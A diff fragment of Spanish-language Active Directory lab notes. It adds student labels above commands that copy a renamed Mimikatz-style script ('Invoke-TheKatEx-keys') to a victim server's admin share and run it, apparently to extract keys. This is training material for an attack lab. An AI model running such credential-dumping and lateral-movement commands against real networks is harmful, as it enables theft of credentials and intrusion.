@@ -588,11 +588,13 @@ Invoke-TheKat -Command $Pwn
 
 Ahora una vez el archivo modificado lo transferiremos a la maquina victima, desde una terminal como administrador
 ```shell
+[student97]
 Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 Navegaremos a la ruta donde lo hemos copiado y lo ejecutaremos
 ```shell
+[]
 .\Invoke-TheKatEx-keys-std97.ps1
 ```
 
